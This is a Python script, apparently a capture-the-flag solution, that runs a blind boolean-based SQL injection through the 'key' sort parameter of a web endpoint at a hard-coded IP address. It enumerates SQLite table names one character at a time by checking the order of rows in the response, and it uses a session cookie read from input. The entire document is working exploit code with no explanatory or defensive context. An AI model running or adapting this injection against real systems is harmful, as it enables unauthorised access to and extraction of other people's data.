import requests

def brute_force_table_name(session):
    table_name1 = ""
    table_name2 = ""
    keyword='1234567890qwertyuiopasdfghjklzxcvbnm'
    base_url = "http://103.77.175.40:8211/sort"
    #session = 'eyJ1c2VyX3Nlc3Npb24iOiIzMmRjZjgwNC0zYmM3LTQ4NzQtYWNmOS1kODg1NDM0ZjFhZDAifQ.aZgnAA.f-ZVLSmvZRH5OSW7I_z95n7juL0'
    for i in range(1,6):
        for j in keyword:
            param1 = f"(SELECT CASE WHEN ((SELECT SUBSTR(tbl_name,{i},1) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = '{j}') THEN date ELSE title END)"
            r = requests.get(url=base_url, cookies={"session":session}, params = {"key":param1})
            
            first = r.text.find('0001-01-01')
            second = r.text.find('0001-03-01')
            if (first < second):
                table_name1 += j
                print(table_name1)    
                break
        else:
            print('No character found')
            break
        
    for i in range(1,10):
        for j in keyword:
            param2 = f"(SELECT CASE WHEN ((SELECT SUBSTR(tbl_name,{i},1) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 1) = '{j}') THEN date ELSE title END)"
            r = requests.get(url=base_url, cookies={"session":session}, params = {"key":param2})
            
            first = r.text.find('0001-01-01')
            second = r.text.find('0001-03-01')
            if (first < second):
                table_name2 += j
                print(table_name2)    
                break
        else:
            print('No character found')
            break
    print('Table 1: ',table_name1)
    print('Table 2: ',table_name2)
if __name__ == '__main__':
    session = input()
    brute_force_table_name(session)